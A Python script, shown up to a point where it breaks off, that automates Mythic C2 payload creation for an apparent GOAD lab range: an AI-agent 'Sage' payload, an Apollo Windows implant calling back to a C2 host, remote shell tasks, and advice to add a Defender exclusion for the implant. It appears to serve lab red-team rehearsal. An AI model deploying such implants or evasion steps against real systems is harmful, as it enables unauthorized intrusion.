#!/usr/bin/env python3
"""Bootstrap Sage and foothold callbacks after a Mythic reset.

This script never deletes files or Mythic objects. It is intended for the reset window:
active Sage/Phoenix DBs are archived, Mythic is reset, local Sage is restarted, then
this helper creates fresh Sage/Apollo payloads before Apollo is launched on CASTELBLACK.
Retained callback configs can be imported explicitly for any foothold payload type. The
older baked-Apollo flow remains available behind --use-baked-apollo.

Examples:
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py inspect
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py export-callback-config --callback 2
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py import-callback-config
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py bootstrap-reset
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py bootstrap-reset --use-retained-callback --retained-callback-config skills/sage-callback-bootstrap/merlin_callback_config.json
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py create-sage --provider Bedrock --model us.anthropic.claude-3-5-sonnet-20241022-v2:0
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py create-apollo --callback-host https://10.4.10.1 --download-dir /tmp/sage_payloads
  .venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py create-all --callback-host https://10.4.10.1 --download-dir /tmp/sage_payloads
"""

from __future__ import annotations

import argparse
import asyncio
import importlib.util
import json
import os
from pathlib import Path
import sys
from datetime import datetime, timezone
from typing import Any

from mythic import mythic


REPO_ROOT = Path(__file__).resolve().parents[3]
LANGGRAPH_ROOT = REPO_ROOT / "Payload_Type" / "sage" / "ai" / "langgraph"
if str(LANGGRAPH_ROOT) not in sys.path:
    sys.path.insert(0, str(LANGGRAPH_ROOT))

from mythic_tools import assess_callback_liveness  # noqa: E402


MYTHIC_ENV_PATH = Path("/home/john/dev/mythic/.env")
SKILL_ENV_PATH = Path(__file__).resolve().parents[1] / ".env"
DEFAULT_SERVER = "127.0.0.1"
DEFAULT_USER = "mythic_admin"
DEFAULT_CALLBACK_CONFIG_PATH = Path(__file__).resolve().parents[1] / "apollo_callback_config.json"
SYNC_RANGE_TIME_PATH = REPO_ROOT / "skills" / "sage-goad-reset" / "scripts" / "sync_range_time.py"
DEFAULT_POST_CALLBACK_TIMEOUT_SECONDS = 180
DEFAULT_MAX_CLOCK_SKEW_SECONDS = 60.0
REQUIRED_RUNTIME_DBS = (
    "Payload_Type/sage/sage.db",
    "Payload_Type/sage/.phoenix/phoenix.db",
)

BOOTSTRAP_SCHEMA_QUERY = """
query BootstrapSchemas {
  payloadtype(where: {name: {_in: ["sage", "apollo"]}}) {
    name
    supported_os
    buildparameters { name parameter_type default_value choices description }
  }
  payloadtypec2profile(where: {payloadtype: {name: {_in: ["sage", "apollo"]}}}) {
    payloadtype { name }
    c2profile {
      name
      description
      c2profileparameters { name required parameter_type default_value choices description }
    }
  }
}
"""

CALLBACK_QUERY = """
query ActiveCallbacks {
  callback(order_by: {display_id: asc}) {
    display_id
    agent_callback_id
    host
    user
    active
    payload { payloadtype { name } }
  }
}
"""

CALLBACK_ID_QUERY = """
query CallbackIdentity($displayId: Int!) {
  callback(where: {display_id: {_eq: $displayId}}, limit: 1) {
    display_id
    agent_callback_id
  }
}
"""

EXPORT_CALLBACK_CONFIG_QUERY = """
query ExportCallbackConfig($agentCallbackId: String!) {
  exportCallbackConfig(agent_callback_id: $agentCallbackId) {
    status
    error
    agent_callback_id
    config
  }
}
"""

IMPORT_CALLBACK_CONFIG_MUTATION = """
mutation ImportCallbackConfig($config: jsonb!) {
  importCallbackConfig(config: $config) {
    status
    error
  }
}
"""

PAYLOAD_ATTRS = """
build_phase
uuid
build_message
build_stdout
build_stderr
filemetum {
  agent_file_id
  filename_utf8
  id
}
"""


def resolve_password(env_path: Path = MYTHIC_ENV_PATH) -> str:
    env_value = os.environ.get("MYTHIC_ADMIN_PASSWORD")
    if env_value:
        return env_value
    if env_path.exists():
        for line in env_path.read_text(encoding="utf-8").splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue
            key, value = stripped.split("=", 1)
            if key.strip() == "MYTHIC_ADMIN_PASSWORD" and value.strip():
                return value.strip().strip("'\"")
    raise RuntimeError(
        "Set MYTHIC_ADMIN_PASSWORD or provide /home/john/dev/mythic/.env with MYTHIC_ADMIN_PASSWORD."
    )


def load_env_file(path: Path = SKILL_ENV_PATH) -> dict[str, str]:
    """Load skill-local defaults without overriding the caller's environment."""
    loaded: dict[str, str] = {}
    if not path.exists():
        return loaded
    for line in path.read_text(encoding="utf-8").splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#") or "=" not in stripped:
            continue
        key, value = stripped.split("=", 1)
        key = key.strip()
        if not key:
            continue
        value = value.strip().strip("'\"")
        loaded[key] = value
        os.environ.setdefault(key, value)
    return loaded


load_env_file()


def env_bool(name: str, default: bool = False) -> bool:
    value = os.environ.get(name)
    if value is None:
        return default
    return value.strip().casefold() in {"1", "true", "yes", "on"}


def callback_config_path(value: str | None = None) -> Path:
    return Path(
        value
        or os.environ.get("APOLLO_CALLBACK_CONFIG_PATH")
        or DEFAULT_CALLBACK_CONFIG_PATH
    ).expanduser()


def _require_success(operation: str, response: dict[str, Any]) -> dict[str, Any]:
    status = str(response.get("status") or "")
    if status.casefold() != "success":
        error = response.get("error") or f"status={status or 'missing'}"
        raise RuntimeError(f"Mythic {operation} failed: {error}")
    return response


def normalize_callback_config(value: Any) -> Any:
    if isinstance(value, str):
        try:
            value = json.loads(value)
        except json.JSONDecodeError as exc:
            raise ValueError(f"Callback config is not valid JSON: {exc}") from exc
    if not isinstance(value, (dict, list)):
        raise ValueError("Callback config must be a JSON object or array.")
    return value


def build_callback_config_document(exported: dict[str, Any]) -> dict[str, Any]:
    exported = _require_success("callback config export", exported)
    return {
        "schema_version": 1,
        "exported_at": datetime.now(timezone.utc).isoformat(),
        "agent_callback_id": exported.get("agent_callback_id"),
        "config": normalize_callback_config(exported.get("config")),
    }


def write_callback_config(path: Path, exported: dict[str, Any]) -> dict[str, Any]:
    document = build_callback_config_document(exported)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(document, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    path.chmod(0o600)
    return document


def load_callback_config(path: Path) -> Any:
    document = json.loads(path.read_text(encoding="utf-8"))
    if isinstance(document, dict) and "config" in document:
        return normalize_callback_config(document["config"])
    return normalize_callback_config(document)


def callback_config_payload_type(config: Any) -> str | None:
    normalized = normalize_callback_config(config)
    if not isinstance(normalized, dict):
        return None
    payload_type = normalized.get("payload_type")
    if isinstance(payload_type, dict):
        payload_type = payload_type.get("name")
    text = str(payload_type or "").strip().casefold()
    return text or None


def _build_parameters(values: dict[str, Any], *, keep_empty: set[str] | None = None) -> list[dict[str, str]]:
    keep_empty = keep_empty or set()
    params: list[dict[str, str]] = []
    for name, value in values.items():
        if value is None:
            continue
        text = str(value)
        if text == "" and name not in keep_empty:
            continue
        params.append({"name": name, "value": text})
    return params


def sage_build_parameters(args: argparse.Namespace) -> list[dict[str, str]]:
    return _build_parameters(
        {
            "provider": args.provider,
            "model": args.model,
            "API_ENDPOINT": args.api_endpoint,
            "API_KEY": args.api_key,
            "AWS_ACCESS_KEY_ID": args.aws_access_key_id,
            "AWS_SECRET_ACCESS_KEY": args.aws_secret_access_key,
            "AWS_SESSION_TOKEN": args.aws_session_token,
            "AWS_DEFAULT_REGION": args.aws_default_region,
        }
    )


def apollo_build_parameters(args: argparse.Namespace) -> list[dict[str, str]]:
    return _build_parameters(
        {
            "output_type": args.output_type,
            "shellcode_format": "Binary",
            "shellcode_bypass": "Continue on fail",
            "adjust_filename": str(args.adjust_filename).lower(),
            "debug": str(args.debug).lower(),
        }
    )


def apollo_c2_profiles(args: argparse.Namespace) -> list[dict[str, Any]]:
    return [
        {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": args.callback_host,
                "callback_port": str(args.callback_port),
                "callback_interval": str(args.callback_interval),
                "callback_jitter": str(args.callback_jitter),
                "AESPSK": args.aespsk,
                "encrypted_exchange_check": "true",
                "get_uri": args.get_uri,
                "post_uri": args.post_uri,
                "query_path_name": args.query_path_name,
            },
        }
    ]


def payload_file_id(payload: dict[str, Any]) -> str | None:
    filemetum = payload.get("filemetum")
    if isinstance(filemetum, list):
        filemetum = filemetum[0] if filemetum else None
    if isinstance(filemetum, dict):
        return filemetum.get("agent_file_id")
    return None


def payload_filename(payload: dict[str, Any], fallback: str) -> str:
    direct = payload.get("filename")
    if direct:
        return str(direct)
    filemetum = payload.get("filemetum")
    if isinstance(filemetum, list):
        filemetum = filemetum[0] if filemetum else None
    if isinstance(filemetum, dict) and filemetum.get("filename_utf8"):
        return str(filemetum["filename_utf8"])
    return fallback


def payload_type_name(callback: dict[str, Any]) -> str:
    payload = callback.get("payload") or {}
    payloadtype = payload.get("payloadtype") or callback.get("payloadtype") or {}
    if isinstance(payloadtype, dict):
        return str(payloadtype.get("name") or "")
    return str(payloadtype or "")


def runtime_db_status(
    repo_root: Path = REPO_ROOT,
    *,
    runtime_dbs_archived: bool = False,
    operator_db_cleanup_confirmed: bool | None = None,
) -> dict[str, Any]:
    if operator_db_cleanup_confirmed is not None:
        runtime_dbs_archived = operator_db_cleanup_confirmed
    required = [repo_root / rel for rel in REQUIRED_RUNTIME_DBS]
    sage_archives = sorted((repo_root / "Payload_Type" / "sage").glob("sage_*.db"))
    phoenix_archives = sorted((repo_root / "Payload_Type" / "sage" / ".phoenix").glob("phoenix_*.db"))
    existing_required = [str(path.relative_to(repo_root)) for path in required if path.exists()]
    existing_archives = [
        str(path.relative_to(repo_root))
        for path in (*sage_archives, *phoenix_archives)
        if path.exists()
    ]
    blocks = bool(existing_required and not runtime_dbs_archived)
    return {
        "ready": not blocks,
        "runtime_dbs_archived": runtime_dbs_archived,
        "operator_db_cleanup_confirmed": runtime_dbs_archived,
        "existing_required": existing_required,
        "existing_archives": existing_archives,
        "existing_session": [
            path for path in existing_archives if Path(path).name.startswith("sage_")
        ],
        "note": (
            "Archive active DBs with sage-goad-reset before Sage restart. Recreated active DB files are expected "
            "after restart and do not block when --runtime-dbs-archived is supplied."
        ),
    }


def summarize_callback_readiness(
    callbacks: list[dict[str, Any]],
    liveness_by_display_id: dict[int, dict[str, Any]],
    *,
    foothold_payload_type: str = "apollo",
) -> dict[str, Any]:
    foothold_payload_type = str(foothold_payload_type or "").strip().casefold()
    if not foothold_payload_type:
        raise ValueError("foothold_payload_type cannot be empty")
    rows = []
    for callback in callbacks:
        display_id = callback.get("display_id")
        ptype = payload_type_name(callback).lower()
        live = liveness_by_display_id.get(display_id) or {}
        rows.append({
            "display_id": display_id,
            "payloadtype": ptype,
            "host": callback.get("host"),
            "user": callback.get("user"),
            "mythic_active": callback.get("active"),
            "live": bool(live.get("alive")),
            "liveness_reason": live.get("reason"),
        })

    live_sage = [
        row for row in rows
        if row["payloadtype"] == "sage" and row["live"]
    ]
    live_foothold = [
        row for row in rows
        if row["payloadtype"] == foothold_payload_type
        and row["live"]
        and str(row.get("host") or "").casefold() == "castelblack"
        and "samwell" in str(row.get("user") or "").casefold()
    ]
    selected_foothold_cb = max((row["display_id"] for row in live_foothold), default=None)
    return {
        "ready": bool(live_sage and live_foothold),
        "callbacks": rows,
        "selected_sage_cb": max((row["display_id"] for row in live_sage), default=None),
        "foothold_payload_type": foothold_payload_type,
        "selected_foothold_cb": selected_foothold_cb,
        "selected_apollo_cb": selected_foothold_cb if foothold_payload_type == "apollo" else None,
        "required": (
            "fresh live sage callback plus live "
            f"{foothold_payload_type} callback on CASTELBLACK as samwell.tarly"
        ),
    }


async def login(args: argparse.Namespace):
    password = args.password or resolve_password(Path(args.env_path))
    return await mythic.login(server_ip=args.server, username=args.user, password=password)


async def inspect(client) -> dict[str, Any]:
    schemas = await mythic.execute_custom_query(client, BOOTSTRAP_SCHEMA_QUERY)
    callbacks = await mythic.execute_custom_query(client, CALLBACK_QUERY)
    return {"schemas": schemas, "callbacks": callbacks.get("callback", [])}


async def resolve_agent_callback_id(client, selector: str) -> str:
    selector = str(selector).strip()
    if not selector:
        raise ValueError("Callback selector cannot be empty.")
    if not selector.isdigit():
        return selector
    result = await mythic.execute_custom_query(
        client,
        CALLBACK_ID_QUERY,
        variables={"displayId": int(selector)},
    )
    callbacks = result.get("callback") or []
    if not callbacks or not callbacks[0].get("agent_callback_id"):
        raise RuntimeError(f"No callback found for display ID {selector}.")
    return str(callbacks[0]["agent_callback_id"])


async def export_callback_config(client, selector: str) -> dict[str, Any]:
    agent_callback_id = await resolve_agent_callback_id(client, selector)
    result = await mythic.execute_custom_query(
        client,
        EXPORT_CALLBACK_CONFIG_QUERY,
        variables={"agentCallbackId": agent_callback_id},
    )
    return _require_success(
        "callback config export",
        result.get("exportCallbackConfig") or {},
    )


async def import_callback_config(client, config: Any) -> dict[str, Any]:
    result = await mythic.execute_custom_query(
        client,
        IMPORT_CALLBACK_CONFIG_MUTATION,
        variables={"config": normalize_callback_config(config)},
    )
    return _require_success(
        "callback config import",
        result.get("importCallbackConfig") or {},
    )


async def readiness(
    client,
    repo_root: Path = REPO_ROOT,
    *,
    runtime_dbs_archived: bool = False,
    operator_db_cleanup_confirmed: bool | None = None,
    foothold_payload_type: str = "apollo",
) -> dict[str, Any]:
    if operator_db_cleanup_confirmed is not None:
        runtime_dbs_archived = operator_db_cleanup_confirmed
    foothold_payload_type = str(foothold_payload_type or "").strip().casefold()
    if not foothold_payload_type:
        raise ValueError("foothold_payload_type cannot be empty")
    observed = await inspect(client)
    liveness_by_display_id: dict[int, dict[str, Any]] = {}
    for callback in observed.get("callbacks", []):
        display_id = callback.get("display_id")
        if not isinstance(display_id, int):
            continue
        if payload_type_name(callback).lower() not in {"sage", foothold_payload_type}:
            continue
        try:
            liveness_by_display_id[display_id] = await assess_callback_liveness(client, display_id)
        except Exception as exc:
            liveness_by_display_id[display_id] = {"alive": False, "reason": f"liveness check failed: {exc}"}

    runtime = runtime_db_status(repo_root, runtime_dbs_archived=runtime_dbs_archived)
    callbacks = summarize_callback_readiness(
        observed.get("callbacks", []),
        liveness_by_display_id,
        foothold_payload_type=foothold_payload_type,
    )
    blockers = []
    if not runtime["ready"]:
        blockers.append("archive stale Sage/Phoenix runtime DBs before restarting Sage")
    if not callbacks["ready"]:
        blockers.append(
            f"fresh live Sage and {foothold_payload_type} callbacks are not both present"
        )
    return {
        "ready": not blockers,
        "blockers": blockers,
        "runtime_databases": runtime,
        "callbacks": callbacks,
    }


def _task_output_text(value: Any) -> str:
    if isinstance(value, (bytes, bytearray)):
        return value.decode("utf-8", errors="replace")
    return str(value or "")


def _load_sync_range_time_module():
    spec = importlib.util.spec_from_file_location("sage_sync_range_time", SYNC_RANGE_TIME_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Cannot load clock sync helper from {SYNC_RANGE_TIME_PATH}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def synchronize_range_clocks(max_skew_seconds: float) -> dict[str, Any]:
    module = _load_sync_range_time_module()
    hosts = module.windows_hosts(module.load_inventory(module.DEFAULT_MCP_PATH))
    if not hosts:
        raise RuntimeError("No GOAD Windows hosts found in Ludus inventory")
    module.sync_clocks(hosts)
    result = module.check_clocks(hosts, max_skew_seconds)
    if not result.get("ready"):
        raise RuntimeError(f"Range clock verification failed: {json.dumps(result, sort_keys=True)}")
    return result


async def wait_for_samwell_apollo_callback(
    client,
    *,
    timeout_seconds: int = DEFAULT_POST_CALLBACK_TIMEOUT_SECONDS,
    poll_seconds: float = 3.0,
) -> dict[str, Any]:
    deadline = asyncio.get_running_loop().time() + timeout_seconds
    last_rows: list[dict[str, Any]] = []
    while True:
        observed = await mythic.execute_custom_query(client, CALLBACK_QUERY)
        last_rows = observed.get("callback", [])
        candidates = [
            callback
            for callback in last_rows
            if payload_type_name(callback).casefold() == "apollo"
            and str(callback.get("host") or "").casefold() == "castelblack"
            and "samwell" in str(callback.get("user") or "").casefold()
            and isinstance(callback.get("display_id"), int)
        ]
        for callback in sorted(
            candidates,
            key=lambda row: int(row["display_id"]),
            reverse=True,
        ):
            liveness = await assess_callback_liveness(client, int(callback["display_id"]))
            if liveness.get("alive"):
                return {
                    "display_id": int(callback["display_id"]),
                    "host": callback.get("host"),
                    "user": callback.get("user"),
                    "liveness": liveness,
                }
        if asyncio.get_running_loop().time() >= deadline:
            raise RuntimeError(
                "Timed out waiting for live Apollo callback on CASTELBLACK as samwell.tarly; "
                f"last callbacks: {json.dumps(last_rows, sort_keys=True)}"
            )
        await asyncio.sleep(poll_seconds)


wait_for_baked_apollo_callback = wait_for_samwell_apollo_callback


async def issue_callback_task(
    client,
    callback_display_id: int,
    command_name: str,
    parameters: str,
    *,
    timeout_seconds: int = 60,
) -> dict[str, Any]:
    task = await mythic.issue_task(
        mythic=client,
        command_name=command_name,
        parameters=parameters,
        callback_display_id=callback_display_id,
        wait_for_complete=False,
        timeout=timeout_seconds,
    )
    task_display_id = task.get("display_id") if isinstance(task, dict) else None
    if not isinstance(task_display_id, int):
        raise RuntimeError(f"Mythic did not return a task display ID for {command_name}")
    output = await asyncio.wait_for(
        mythic.waitfor_for_task_output(
            mythic=client,
            task_display_id=task_display_id,
            timeout=timeout_seconds,
        ),
        timeout=timeout_seconds + 20,
    )
    return {
        "task_display_id": task_display_id,
        "output": _task_output_text(output),
    }


def parse_callback_probe(
    output: str,
    *,
    max_skew_seconds: float = DEFAULT_MAX_CLOCK_SKEW_SECONDS,
    controller_utc: datetime | None = None,
) -> dict[str, Any]:
    decoder = json.JSONDecoder()
    observed = None
    for index, char in enumerate(output):
        if char != "{":
            continue
        try:
            candidate, _ = decoder.raw_decode(output[index:])
        except json.JSONDecodeError:
            continue
        if isinstance(candidate, dict):
            observed = candidate
    if observed is None:
        raise RuntimeError(f"Callback identity probe returned no JSON object: {output!r}")

    normalized = {str(key).casefold(): value for key, value in observed.items()}
    guest_utc_text = str(normalized.get("utc") or "")
    domain = str(normalized.get("domain") or "").strip()
    identity = str(normalized.get("user") or "").strip()
    if not guest_utc_text or not domain or not identity:
        raise RuntimeError(f"Callback identity probe was incomplete: {observed!r}")

    guest_utc = datetime.fromisoformat(guest_utc_text.replace("Z", "+00:00")).astimezone(timezone.utc)
    controller_utc = (controller_utc or datetime.now(timezone.utc)).astimezone(timezone.utc)
    skew_seconds = abs((guest_utc - controller_utc).total_seconds())
    if skew_seconds > max_skew_seconds:
        raise RuntimeError(
            f"Callback clock skew is {skew_seconds:.3f}s; maximum is {max_skew_seconds:.3f}s"
        )
    return {
        "ready": True,
        "guest_utc": guest_utc.isoformat(),
        "controller_utc": controller_utc.isoformat(),
        "skew_seconds": round(skew_seconds, 3),
        "domain": domain,
        "identity": identity,
    }


async def post_callback_preflight(
    client,
    *,
    timeout_seconds: int = DEFAULT_POST_CALLBACK_TIMEOUT_SECONDS,
    max_skew_seconds: float = DEFAULT_MAX_CLOCK_SKEW_SECONDS,
) -> dict[str, Any]:
    callback = await wait_for_samwell_apollo_callback(
        client,
        timeout_seconds=timeout_seconds,
    )
    clocks = await asyncio.to_thread(synchronize_range_clocks, max_skew_seconds)
    callback_id = callback["display_id"]

    purge = await issue_callback_task(
        client,
        callback_id,
        "shell",
        "klist purge",
    )
    if "purged" not in purge["output"].casefold():
        raise RuntimeError(f"Kerberos ticket purge was not confirmed: {purge['output']!r}")

    probe_command = (
        'powershell -NoProfile -NonInteractive -Command '
        '"$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name;'
        "$u=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name;"
        "[PSCustomObject]@{Utc=(Get-Date).ToUniversalTime().ToString('o');Domain=$d;User=$u}"
        '|ConvertTo-Json -Compress"'
    )
    probe_task = await issue_callback_task(
        client,
        callback_id,
        "shell",
        probe_command,
    )
    probe = parse_callback_probe(
        probe_task["output"],
        max_skew_seconds=max_skew_seconds,
    )
    return {
        "ready": True,
        "apollo_callback": callback,
        "range_clocks": clocks,
        "kerberos_purge_task": purge["task_display_id"],
        "identity_probe_task": probe_task["task_display_id"],
        "identity_probe": probe,
    }


async def create_sage(client, args: argparse.Namespace) -> dict[str, Any]:
    return await mythic.create_payload(
        client,
        payload_type_name="sage",
        filename=args.sage_filename,
        operating_system="Sage",
        c2_profiles=[],
        build_parameters=sage_build_parameters(args),
        description="Fresh Sage callback for GOAD guided solve rehearsal",
        include_all_commands=True,
        custom_return_attributes=PAYLOAD_ATTRS,
    )


async def create_apollo(client, args: argparse.Namespace) -> dict[str, Any]:
    if not args.callback_host:
        raise ValueError(
            "Set APOLLO_CALLBACK_HOST in skills/sage-callback-bootstrap/.env "
            "or pass --callback-host."
        )
    return await mythic.create_payload(
        client,
        payload_type_name="apollo",
        filename=args.apollo_filename,
        operating_system="Windows",
        c2_profiles=apollo_c2_profiles(args),
        build_parameters=apollo_build_parameters(args),
        description="Fresh Apollo foothold payload for CASTELBLACK GOAD rehearsal",
        include_all_commands=True,
        custom_return_attributes=PAYLOAD_ATTRS,
    )


async def maybe_download_payload(client, payload: dict[str, Any], download_dir: str | None) -> dict[str, Any] | None:
    if not download_dir:
        return None
    payload_uuid = payload.get("uuid")
    if not payload_uuid:
        return {"downloaded": False, "error": "payload response had no uuid"}
    target_dir = Path(download_dir)
    target_dir.mkdir(parents=True, exist_ok=True)
    data = await mythic.download_payload(client, payload_uuid=payload_uuid)
    filename = payload_filename(payload, f"{payload_uuid}.bin")
    path = target_dir / Path(filename).name
    path.write_bytes(data)
    return {"downloaded": True, "path": str(path), "bytes": len(data)}


async def command_inspect(args: argparse.Namespace) -> None:
    client = await login(args)
    print(json.dumps(await inspect(client), indent=2, sort_keys=True))


async def command_readiness(args: argparse.Namespace) -> None:
    client = await login(args)
    print(json.dumps(
        await readiness(
            client,
            Path(args.repo_root),
            runtime_dbs_archived=args.runtime_dbs_archived,
            foothold_payload_type=args.foothold_payload_type,
        ),
        indent=2,
        sort_keys=True,
    ))


async def command_export_callback_config(args: argparse.Namespace) -> None:
    client = await login(args)
    exported = await export_callback_config(client, args.callback)
    path = callback_config_path(args.output)
    document = write_callback_config(path, exported)
    print(json.dumps({
        "status": "success",
        "path": str(path),
        "agent_callback_id": document.get("agent_callback_id"),
    }, indent=2, sort_keys=True))


async def command_import_callback_config(args: argparse.Namespace) -> None:
    client = await login(args)
    path = callback_config_path(args.config)
    result = await import_callback_config(client, load_callback_config(path))
    print(json.dumps({
        "callback_config": str(path),
        "import": result,
    }, indent=2, sort_keys=True))


async def command_create_sage(args: argparse.Namespace) -> None:
    client = await login(args)
    result = {"sage": await create_sage(client, args)}
    result["callbacks_after"] = (await mythic.execute_custom_query(client, CALLBACK_QUERY)).get("callback", [])
    print(json.dumps(result, indent=2, sort_keys=True))


async def command_create_apollo(args: argparse.Namespace) -> None:
    client = await login(args)
    apollo = await create_apollo(client, args)
    result = {"apollo": apollo}
    download = await maybe_download_payload(client, apollo, args.download_dir)
    if download:
        result["apollo_download"] = download
    print(json.dumps(result, indent=2, sort_keys=True))


async def command_create_all(args: argparse.Namespace) -> None:
    client = await login(args)
    sage = await create_sage(client, args)
    apollo = await create_apollo(client, args)
    result = {"sage": sage, "apollo": apollo}
    download = await maybe_download_payload(client, apollo, args.download_dir)
    if download:
        result["apollo_download"] = download
    result["callbacks_after"] = (await mythic.execute_custom_query(client, CALLBACK_QUERY)).get("callback", [])
    print(json.dumps(result, indent=2, sort_keys=True))


def fresh_apollo_bootstrap_instructions(apollo: dict[str, Any]) -> dict[str, Any]:
    payload_uuid = str(apollo.get("uuid") or "<apollo-payload-uuid>")
    return {
        "required": True,
        "method": "interactive-rdp-scheduled-task",
        "payload_uuid": payload_uuid,
        "notes": [
            "Open an RDP session as NORTH\\samwell.tarly on CASTELBLACK before launching Apollo.",
            "Launch the staged payload with --launch-method scheduled-task-interactive; the default remote path is C:\\Users\\Public\\apollo.exe.",
            "After a new callback is observed, the deploy helper disconnects the RDP session with tsdiscon by default; use --no-disconnect-interactive-session only for troubleshooting.",
            "Use --add-defender-exclusion for C:\\Users\\Public\\apollo.exe on clean-baseline; stock Apollo was quarantined by Defender in live validation.",
            "After the callback appears, run post-callback-preflight and readiness before a solve.",
        ],
    }


def retained_callback_bootstrap_instructions(payload_type: str) -> dict[str, Any]:
    return {
        "required": True,
        "payload_type": payload_type,
        "notes": [
            "Launch the retained payload process after Mythic imports its callback config; this helper does not execute target-side payloads.",
            (
                "After the callback appears, run readiness --runtime-dbs-archived "
                f"--foothold-payload-type {payload_type} before a solve."
            ),
        ],
    }


async def command_bootstrap_reset(args: argparse.Namespace) -> None:
    use_baked_apollo = bool(getattr(args, "use_baked_apollo", False))
    use_retained_callback = bool(getattr(args, "use_retained_callback", False))
    if use_baked_apollo and use_retained_callback:
        raise ValueError("--use-baked-apollo and --use-retained-callback are mutually exclusive")

    path = callback_config_path(getattr(args, "callback_config", None))
    retained_path: Path | None = None
    retained_config: Any = None
    retained_payload_type: str | None = None
    if use_baked_apollo:
        if not path.exists():
            raise RuntimeError(f"--use-baked-apollo requires callback config at {path}")
    elif use_retained_callback:
        retained_value = (
            getattr(args, "retained_callback_config", None)
            or os.environ.get("RETAINED_CALLBACK_CONFIG_PATH")
        )
        if not retained_value:
            raise RuntimeError(
                "--use-retained-callback requires --retained-callback-config "
                "or RETAINED_CALLBACK_CONFIG_PATH"
            )
        retained_path = Path(retained_value).expanduser()
        if not retained_path.exists():
            raise RuntimeError(
                f"--use-retained-callback requires callback config at {retained_path}"
            )
        retained_config = load_callback_config(retained_path)
        retained_payload_type = callback_config_payload_type(retained_config)
        if not retained_payload_type:
            raise RuntimeError(
                f"Retained callback config at {retained_path} has no payload_type.name"
            )

    client = await login(args)
    result: dict[str, Any] = {"sage": await create_sage(client, args)}
    if use_baked_apollo:
        result["apollo_callback_import"] = await import_callback_config(
            client,
            load_callback_config(path),
        )
        result["apollo_callback_config"] = str(path)
        result["mode"] = "legacy-imported-baked-apollo"
        result["post_callback_preflight"] = await post_callback_preflight(
            client,
            timeout_seconds=args.post_callback_timeout,
            max_skew_seconds=args.max_clock_skew_seconds,
        )
    elif use_retained_callback:
        assert retained_path is not None
        assert retained_payload_type is not None
        result["retained_callback_import"] = await import_callback_config(
            client,
            retained_config,
        )
        result["retained_callback_config"] = str(retained_path)
        result["retained_payload_type"] = retained_payload_type
        result["mode"] = "imported-retained-callback"
        result["retained_callback_bootstrap"] = retained_callback_bootstrap_instructions(
            retained_payload_type
        )
    else:
        apollo = await create_apollo(client, args)
        result["apollo"] = apollo
        download = await maybe_download_payload(client, apollo, args.download_dir)
        if download:
            result["apollo_download"] = download
        result["mode"] = "fresh-interactive-apollo"
        result["apollo_bootstrap"] = fresh_apollo_bootstrap_instructions(apollo)
    result["callbacks_after"] = (await mythic.execute_custom_query(client, CALLBACK_QUERY)).get("callback", [])
    print(json.dumps(result, indent=2, sort_keys=True))


async def command_post_callback_preflight(args: argparse.Namespace) -> None:
    client = await login(args)
    print(json.dumps(
        await post_callback_preflight(
            client,
            timeout_seconds=args.post_callback_timeout,
            max_skew_seconds=args.max_clock_skew_seconds,
        ),
        indent=2,
        sort_keys=True,
    ))


def add_common(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--server", default=DEFAULT_SERVER)
    parser.add_argument("--user", default=DEFAULT_USER)
    parser.add_argument("--password", default=None)
    parser.add_argument("--env-path", default=str(MYTHIC_ENV_PATH))


def add_sage_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--sage-filename", default=os.environ.get("SAGE_FILENAME", "sage-goad-fresh"))
    parser.add_argument("--provider", default=os.environ.get("SAGE_PROVIDER", "Bedrock"))
    parser.add_argument("--model", default=os.environ.get("SAGE_MODEL", ""))
    parser.add_argument("--api-endpoint", default=os.environ.get("SAGE_API_ENDPOINT", ""))
    parser.add_argument("--api-key", default=os.environ.get("SAGE_API_KEY", ""))
    parser.add_argument("--aws-access-key-id", default=os.environ.get("AWS_ACCESS_KEY_ID", ""))
    parser.add_argument("--aws-secret-access-key", default=os.environ.get("AWS_SECRET_ACCESS_KEY", ""))
    parser.add_argument("--aws-session-token", default=os.environ.get("AWS_SESSION_TOKEN", ""))
    parser.add_argument("--aws-default-region", default=os.environ.get("AWS_DEFAULT_REGION", "us-east-1"))


def add_apollo_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "--apollo-filename",
        default=os.environ.get("APOLLO_FILENAME", "apollo.exe"),
    )
    parser.add_argument("--callback-host", default=os.environ.get("APOLLO_CALLBACK_HOST", ""))
    parser.add_argument("--callback-port", default=int(os.environ.get("APOLLO_CALLBACK_PORT", "80")), type=int)
    parser.add_argument(
        "--callback-interval",
        default=int(os.environ.get("APOLLO_CALLBACK_INTERVAL", "3")),
        type=int,
    )
    parser.add_argument(
        "--callback-jitter",
        default=int(os.environ.get("APOLLO_CALLBACK_JITTER", "23")),
        type=int,
    )
    parser.add_argument(
        "--aespsk",
        default=os.environ.get("APOLLO_AESPSK", "aes256_hmac"),
        choices=["aes256_hmac", "none"],
    )
    parser.add_argument("--get-uri", default=os.environ.get("APOLLO_GET_URI", "index"))
    parser.add_argument("--post-uri", default=os.environ.get("APOLLO_POST_URI", "data"))
    parser.add_argument("--query-path-name", default=os.environ.get("APOLLO_QUERY_PATH_NAME", "q"))
    parser.add_argument(
        "--output-type",
        default=os.environ.get("APOLLO_OUTPUT_TYPE", "WinExe"),
        choices=["WinExe", "Shellcode", "Service", "Source"],
    )
    parser.add_argument(
        "--adjust-filename",
        action=argparse.BooleanOptionalAction,
